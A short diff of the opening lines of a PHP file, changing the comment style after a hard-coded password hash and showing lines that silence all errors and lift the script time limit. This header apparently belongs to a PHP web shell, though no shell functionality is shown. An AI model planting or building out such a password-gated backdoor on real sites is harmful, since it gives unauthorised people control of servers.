@@ -1,6 +1,6 @@
 <?php
 
-$password = '0c77b9949b3f9c2db133ee7db2620b99'; /* yanz
+$password = '0c77b9949b3f9c2db133ee7db2620b99'; // yanz
 error_reporting(0);
 set_time_limit(0);
 
